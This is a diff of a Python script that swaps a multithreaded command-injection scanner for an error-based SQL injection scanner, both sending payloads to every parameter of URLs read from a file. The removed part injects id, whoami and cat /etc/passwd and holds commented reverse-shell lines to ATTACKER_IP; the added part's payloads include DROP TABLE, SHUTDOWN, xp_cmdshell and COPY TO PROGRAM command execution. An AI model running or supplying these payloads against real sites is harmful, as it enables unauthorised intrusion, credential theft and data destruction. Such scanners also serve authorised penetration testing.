@@ -1,213 +1,257 @@
-#!/usr/bin/env python3
-
-import argparse
 import requests
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import threading
+import argparse
+from urllib.parse import urlparse, parse_qs, urlencode
 from colorama import Fore, Style, init
-import concurrent.futures
-import urllib3
-import time
-import urllib.parse
+from math import ceil
+import sys
 
 # Initialize colorama for colored output
 init(autoreset=True)
 
-# Suppress SSL warnings
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# Suppress only the single InsecureRequestWarning from urllib3 needed.
+from urllib3.exceptions import InsecureRequestWarning
+import urllib3
+urllib3.disable_warnings(InsecureRequestWarning)
 
-# Define Command Injection payloads with diverse variations
-cmd_inj_payloads = [
-    # Simple Command Execution
-    {"payload": ";& id", "keyword": "uid="},
-    {"payload": "| id", "keyword": "uid="},
-    {"payload": "&& id", "keyword": "uid="},
-    {"payload": "; whoami", "keyword": "root"},  # Assuming root privileges
-    {"payload": "| whoami", "keyword": "root"},
-    {"payload": "&& uname -a", "keyword": "Linux"},  # Common in Linux systems
-    
-    # Data Exfiltration Commands
-    {"payload": ";& cat /etc/passwd", "keyword": "root:x:0:0:"},
-    {"payload": "| cat /etc/passwd", "keyword": "root:x:0:0:"},
-    {"payload": "&& cat /etc/passwd", "keyword": "root:x:0:0:"},
-    
-    # Reverse Shell Commands (Use with Caution)
-    # {"payload": ";& bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1", "keyword": ""},  # Replace with actual IP and PORT
-    # {"payload": "| nc ATTACKER_IP PORT -e /bin/bash", "keyword": ""},  # Replace with actual IP and PORT
-    
-    # Encoded Payloads
-    {"payload": "%3B%20id", "keyword": "uid="},  # URL-encoded ; id
-    {"payload": "%7C%20id", "keyword": "uid="},  # URL-encoded | id
-    
-    # Nested Commands
-    {"payload": "; ls -la", "keyword": "total"},  # Directory listing indicator
-    {"payload": "| ls -la", "keyword": "total"},
-    {"payload": "&& ls -la", "keyword": "total"},
-    
-    # Environment Variable Exposure
-    {"payload": ";& echo $HOME", "keyword": "/home"},
-    {"payload": "| echo $HOME", "keyword": "/home"},
-    {"payload": "&& echo $HOME", "keyword": "/home"},
-    
-    # Windows Specific Commands
-    {"payload": "& whoami", "keyword": "NT AUTHORITY"},
-    {"payload": "| whoami", "keyword": "NT AUTHORITY"},
-    {"payload": "&& whoami", "keyword": "NT AUTHORITY"},
-    {"payload": "& ipconfig", "keyword": "IPv4"},  # Indicator of ipconfig output
-    {"payload": "| ipconfig", "keyword": "IPv4"},
-    {"payload": "&& ipconfig", "keyword": "IPv4"},
+# Enhanced SQLi payloads designed to trigger SQL errors
+payloads = [
+    "'", '"', "`", "\\", ")", "('", ")'", "'))", '"', '")', '"("', "' OR '1'='1",
+    "' OR 1=1--", "' OR '1'='1' --", "' OR '1'='1' ({", "' OR '1'='1' /*",
+    "' OR '1'='1' /*", "' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
+    "' OR 1=1#", "' OR 1=1/*", "' OR 'a'='a", "' OR '1'='1' -- -",
+    "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 LIMIT 1--",
+    "' OR EXISTS(SELECT 1)--", "' AND 1=0 UNION ALL SELECT NULL--",
+    "' UNION SELECT ALL FROM information_schema.tables--",
+    "' UNION SELECT username, password FROM users--",
+    "' OR UPDATE users SET role = 'admin' WHERE username = 'admin'--",
+    "' AND ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES),1,1)) > 80 --",
+    "' OR OPENROWSET('SQL Server', 'Server=localhost;UID=sa;PWD=;', 'SELECT name FROM sys.databases')--",
+    "' OR (SELECT COUNT(*) FROM users) > 0--",
+    "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
+    "' OR 1=1; EXEC xp_cmdshell('dir'); --",
+    "'; EXECUTE IMMEDIATE 'DROP TABLE users'; --",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+    "' OR 1=1-- -",
+    "' OR 1=1#",
+    "' OR '1'='1'#",
+    "' OR '1'='1'--",
+    "' OR '1'='1'/*",
+    "' OR '1'='1' or ''='",
+    "' OR 1=1 OR ''='",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' or 1=1--",
+    "' or 1=1#",
+    "' or 1=1/*",
+    "' OR '1'='1' AND '1'='1",
+    "' AND (SELECT COUNT(*) FROM users) > 0 --",
+    "' AND EXISTS(SELECT * FROM users WHERE username = 'admin') --",
+    "' AND SLEEP(5)--",
+    "' WAITFOR DELAY '0:0:5'--",
+    "'; SHUTDOWN; --",
+    "'; DROP TABLE users; --",
+    "'; SELECT pg_sleep(5); --",
+    "'; SELECT pg_cancel_backend(pg_backend_pid()); --",
+    "'; COPY (SELECT '') TO PROGRAM 'cmd.exe /c calc.exe'; --",
+    "'; EXEC xp_cmdshell('ping 127.0.0.1'); --",
+    "'; DECLARE @q NVARCHAR(4000); SET @q='calc.exe'; EXEC(@q); --"
 ]
 
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="Automate Command Injection testing with payload variations.")
-    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
-    parser.add_argument("-o", "--output", required=True, help="Output file for vulnerable URLs")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
-    return parser.parse_args()
+# Comprehensive SQL error messages list for various databases
+error_messages = [
+    # General SQL Errors
+    "SQL syntax", "syntax error", "Warning: mysql", "Warning: mysqli",
+    "You have an error in your SQL syntax", "supplied argument is not a valid MySQL result resource",
+    "Unclosed quotation mark after the character string", "quoted string not properly terminated",
+    "General error", "SQLSTATE", "Microsoft OLE DB Provider for SQL Server",
+    "Incorrect syntax near", "SQL query failed", "Unknown column", "WHERE clause", "Invalid query",
+    "DB Error", "Syntax error in string in query expression", "Division by zero", "ORA-",
+    "missing right parenthesis", "Invalid use of NULL", "ODBC SQL", "SQL Server", "MySQL Error",
+    "MariaDB server version for the right syntax to use", "PG::SyntaxError", "psql:", "fatal error",
+    "ORA-00933", "ORA-01756", "Warning: pg_", "unterminated quoted string at or near", "ERROR:",
 
-def load_urls(file_path):
-    try:
-        with open(file_path, "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"{Fore.RED}Error: Input file '{file_path}' not found.")
-        exit(1)
+    # MySQL Error Messages
+    "Warning: mysql_fetch_array()", "Warning: mysql_num_rows()", "Warning: mysql_pconnect()",
+    "Warning: mysql_result()", "MySQL server version for the right syntax to use near",
+    "MySQL Error:", "Warning: mysqli_query()", "Warning: mysqli_fetch_array()",
+    "Unknown column in 'field list'", "MySQL server has gone away",
+    "Column count doesn't match value count at row", "Duplicate entry for key",
+    "Can't find file", "Out of range value for column", "Error executing query",
+    "Access denied for user", "No database selected", "Not a valid MySQL result resource",
+    "You have an error in your SQL syntax; check the manual",
 
-def inject_payload(url, param, payload):
-    try:
+    # MSSQL Error Messages
+    "Unclosed quotation mark after the character string", "Incorrect syntax near",
+    "Syntax error converting the varchar value to a column of data type int",
+    "Microsoft OLE DB Provider for SQL Server", "Must declare scalar variable",
+    "Conversion failed when converting the varchar value", "The multi-part identifier could not be bound",
+    "Invalid object name", "Login failed for user", "Warning: mssql_query()",
+    "Warning: mssql_connect()", "Warning: mssql_fetch_array()", "Invalid cursor state",
+    "Error converting data type varchar to numeric", "Cannot insert duplicate key",
+    "Violation of PRIMARY KEY constraint", "Invalid column name", "Procedure expects parameter",
+    "Cannot insert explicit value for identity column", "General SQL Server error",
+
+    # PostgreSQL Error Messages
+    "PostgreSQL query failed: ERROR: syntax error", "pg_query(): Query failed",
+    "Warning: pg_exec()", "Warning: pg_query()", "Warning: pg_num_rows()",
+    "Warning: pg_fetch_array()", "unterminated quoted string at or near",
+    "invalid input syntax for integer", "ERROR: column does not exist",
+    "ERROR: syntax error at or near", "ERROR: relation", "ERROR: division by zero",
+    "ERROR: invalid byte sequence for encoding", "ERROR: permission denied for relation",
+    "ERROR: invalid input value for enum", "ERROR: invalid regular expression",
+    "ERROR: function does not exist", "ERROR: operator does not exist",
+    "Cannot insert a duplicate key value", "ERROR: cannot insert into a column referenced in a foreign key",
+
+    # Oracle Error Messages
+    "ORA-00933: SQL command not properly ended", "ORA-00921: unexpected end of SQL command",
+    "ORA-00942: table or view does not exist", "ORA-01756: quoted string not properly terminated",
+    "ORA-00904: invalid identifier", "ORA-01400: cannot insert NULL into",
+    "ORA-01401: inserted value too large for column", "ORA-01722: invalid number",
+    "ORA-06550: line", "PLS-00103: Encountered the symbol", "ORA-00936: missing expression",
+    "ORA-00907: missing right parenthesis", "ORA-00001: unique constraint violated",
+    "ORA-01830: date format picture ends before converting entire input string",
+    "ORA-00917: missing comma", "ORA-01438: value larger than specified precision",
+    "ORA-00932: inconsistent datatypes", "ORA-00984: column not allowed here",
+    "ORA-00979: not a GROUP BY expression", "ORA-02291: integrity constraint violation",
+    "ORA-06512: at line", "ORA-04091: table is mutating, trigger/function may not see it",
+    "ORA-01031: insufficient privileges", "ORA-01555: snapshot too old",
+
+    # SQLite Error Messages
+    "SQLite error: near", "SQL logic error or missing database", "no such table",
+    "SQLite3::query(): Unable to prepare statement", "SQLite3::exec(): not an error",
+    "unable to open database file", "no such column", "datatype mismatch",
+    "column index out of range", "unrecognized token", "constraint failed",
+    "syntax error near unexpected token", "file is encrypted or is not a database",
+
+    # MariaDB Error Messages
+    "ERROR 1064 (42000): You have an error in your SQL syntax", "Warning: mariadb_query()",
+    "Column count doesn't match value count", "MySQL server has gone away",
+    "Access denied for user", "Can't find file",
+
+    # General Error Messages
+    "Warning: odbc_exec()", "Database error", "Query failed", "ODBC SQL Server Driver",
+    "Invalid query", "Error executing query", "Fatal error:", "ORA-06502: PL/SQL: numeric or value error",
+    "ODBC error", "Syntax error", "Server error in '/' application", "Query error",
+    "SQL syntax error", "Query execution error", "DB query failed", "Database connection failed",
+    "Invalid database name", "Incorrect syntax near 'keyword'", "Invalid parameter value",
+    "Access violation", "Unclosed quotation mark", "Command not found",
+    "Invalid SQL statement"
+]
+
+# Function to test SQL injection for a single URL parameter
+def test_sqli(url, param, original_value, verbose):
+    for payload in payloads:
         parsed_url = urlparse(url)
         params = parse_qs(parsed_url.query)
-        # Replace the parameter with the payload
-        params[param] = payload
+        # Preserve other parameters and inject payload into the target parameter
+        params[param] = original_value + payload
         new_query = urlencode(params, doseq=True)
-        injected_url = urlunparse(parsed_url._replace(query=new_query))
-        # Send the GET request
-        response = requests.get(injected_url, timeout=10, verify=False, allow_redirects=True)
-        return response.text, injected_url
-    except requests.exceptions.RequestException as e:
-        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
-        return "", None
+        test_url = parsed_url._replace(query=new_query).geturl()
 
-def inject_payload_with_time(url, param, payload):
-    try:
-        parsed_url = urlparse(url)
-        params = parse_qs(parsed_url.query)
-        # Replace the parameter with the payload
-        params[param] = payload
-        new_query = urlencode(params, doseq=True)
-        injected_url = urlunparse(parsed_url._replace(query=new_query))
-        start_time = time.time()
-        response = requests.get(injected_url, timeout=15, verify=False, allow_redirects=True)
-        end_time = time.time()
-        elapsed_time = end_time - start_time
-        return response.text, (elapsed_time > 5), injected_url  # Threshold set to 5 seconds
-    except requests.exceptions.RequestException as e:
-        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
-        return "", False, None
+        # If verbose mode is enabled, show the current payload being tested
+        if verbose:
+            print(f"Testing: {test_url} with payload: {payload}")
 
-def analyze_response(response_text, expected_keyword):
-    if expected_keyword in response_text:
-        # Find the index of the first occurrence of the keyword
-        index = response_text.find(expected_keyword)
-        if index == -1:
-            return True, ""
-        # Define the number of characters to extract before and after the keyword
-        context_size = 20
-        start = max(index - context_size, 0)
-        end = min(index + len(expected_keyword) + context_size, len(response_text))
-        context = response_text[start:end]
-        return True, context
-    return False, ""
-
-def decode_payload(payload):
-    try:
-        return urllib.parse.unquote(payload)
-    except:
-        return payload
-
-def select_payloads(url):
-    # Placeholder for logic to select payloads based on the URL or detected engine
-    # Currently returns all payloads
-    return cmd_inj_payloads
-
-def test_url(url):
-    vulnerable = False
-    parsed_url = urlparse(url)
-    params = parse_qs(parsed_url.query)
-    if not params:
-        # No parameters to test
-        print(f"{Fore.YELLOW}No parameters found in URL: {url}")
-        return None
-
-    for param in params:
-        for payload_entry in select_payloads(url):
-            payload = payload_entry["payload"]
-            keyword = payload_entry["keyword"]
-
-            # Determine if the payload is time-based (contains 'sleep' or 'time')
-            is_time_based = False
-            if "sleep" in payload.lower() or "time" in payload.lower():
-                is_time_based = True
-
-            if is_time_based:
-                response_text, is_delayed, injected_url = inject_payload_with_time(url, param, payload)
-                if is_delayed:
-                    vulnerable = True
-                    print(f"{Fore.GREEN}Vulnerable (Time-Based): {url} [Param: {param}, Payload: {payload}]")
-                    if injected_url:
-                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
-                    # Optionally, display a snippet indicating the delay
-                    print(f"{Fore.GREEN}Response Time: {Fore.YELLOW}{round(end_time - start_time, 2)} seconds")
-                    return url  # Stop after first vulnerability detected
-            else:
-                # Handle encoded payloads
-                decoded_payload = decode_payload(payload)
-                response_text, injected_url = inject_payload(url, param, payload)
-                if not response_text:
-                    continue  # Skip if no response was received
-                detected, context = analyze_response(response_text, keyword)
-                if detected:
-                    vulnerable = True
-                    print(f"{Fore.GREEN}Vulnerable: {url} [Param: {param}, Payload: {payload}]")
-                    if injected_url:
-                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
-                    if context:
-                        print(f"{Fore.GREEN}Context: ...{context}...")
-                    return url  # Stop after first vulnerability detected
-                else:
-                    continue
-    if not vulnerable:
-        print(f"{Fore.RED}Not Vulnerable: {url}")
+        try:
+            response = requests.get(test_url, timeout=5, verify=False)
+            for error in error_messages:
+                if error.lower() in response.text.lower():
+                    return (test_url, payload, error)
+        except requests.RequestException as e:
+            if verbose:
+                print(f"Request failed: {e}")
+            continue
     return None
 
-def main():
-    args = parse_arguments()
-    urls = load_urls(args.input)
-    vulnerable_urls = []
+# Worker function for threading
+def worker(urls, output_file, lock, results_counter, total_urls, verbose):
+    for url in urls:
+        parsed_url = urlparse(url)
+        params = parse_qs(parsed_url.query)
+        if not params:
+            continue  # Skip URLs without parameters
+
+        found = False
+
+        for param, values in params.items():
+            original_value = values[0]
+            result = test_sqli(url, param, original_value, verbose)
+
+            with lock:
+                results_counter[0] += 1
+
+                # Print URL header in a box-like format
+                print(f"┌{'─'*80}┐")
+                header = f" Testing URL {results_counter[0]} / {total_urls} "
+                print(f"│{header.center(80)}│")
+                print(f"└{'─'*80}┘")
+
+                if result:
+                    print(Fore.GREEN + f"   URL: {result[0]}")
+                    print(Fore.GREEN + f"   Parameter: {param}")
+                    print(Fore.GREEN + f"   Payload: {result[1]}")
+                    print(Fore.GREEN + f"   Status: Vulnerable [✔️]")
+                    print(Fore.GREEN + f"   Error Detected: {result[2]}")
+                    with open(output_file, 'a') as f:
+                        f.write(f"Potential SQLi detected:\n")
+                        f.write(f"URL: {result[0]}\n")
+                        f.write(f"Parameter: {param}\n")
+                        f.write(f"Payload: {result[1]}\n")
+                        f.write(f"Error: {result[2]}\n")
+                        f.write("-" * 80 + "\n")
+                    found = True
+                else:
+                    if verbose:
+                        print(Fore.RED + f"   URL: {url}")
+                        print(Fore.RED + f"   Parameter: {param}")
+                        print(Fore.RED + "   Status: Not vulnerable [❌]")
+
+# Main function
+def main(input_file, output_file, thread_count, verbose):
+    try:
+        with open(input_file, 'r') as f:
+            urls = [line.strip() for line in f.readlines() if line.strip()]
+    except FileNotFoundError:
+        print(Fore.RED + f"Input file '{input_file}' not found.")
+        sys.exit(1)
 
     if not urls:
-        print(f"{Fore.RED}Error: No URLs found in the input file.")
-        exit(1)
+        print(Fore.YELLOW + "No URLs to process.")
+        sys.exit(0)
 
-    print(f"{Fore.CYAN}Starting Command Injection testing with {len(urls)} URLs using {args.threads} threads...\n")
+    # Overwrite the output file at the start
+    with open(output_file, 'w') as f:
+        f.write("")
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-        future_to_url = {executor.submit(test_url, url): url for url in urls}
-        for future in concurrent.futures.as_completed(future_to_url):
-            result = future.result()
-            if result:
-                vulnerable_urls.append(result)
+    total_urls = len(urls)
+    results_counter = [0]  # Shared counter between threads
+    lock = threading.Lock()
 
-    # Write vulnerable URLs to output file
-    if vulnerable_urls:
-        try:
-            with open(args.output, "w") as f:
-                for vuln_url in vulnerable_urls:
-                    f.write(f"{vuln_url}\n")
-            print(f"\n{Fore.CYAN}Vulnerable URLs have been saved to '{args.output}'")
-        except Exception as e:
-            print(f"{Fore.RED}Error writing to output file '{args.output}': {e}")
-    else:
-        print(f"\n{Fore.CYAN}No vulnerable URLs found.")
+    # Adjust chunking logic for dividing URLs among threads
+    chunk_size = ceil(total_urls / thread_count)
+    threads = []
 
+    for i in range(thread_count):
+        start = i * chunk_size
+        end = min(start + chunk_size, total_urls)
+        thread = threading.Thread(target=worker, args=(urls[start:end], output_file, lock, results_counter, total_urls, verbose))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    print(Fore.CYAN + f"\nScanning completed. Results saved to '{output_file}'.")
+
+# Command-line argument parsing
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="SQL Injection Error-based Detection Script")
+    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
+    parser.add_argument("-o", "--output", required=True, help="Output file for results")
+    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads (default: 1)")
+    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose mode to print all URLs being tested with payloads")
+
+    args = parser.parse_args()
+    main(args.input, args.output, args.threads, args.verbose)
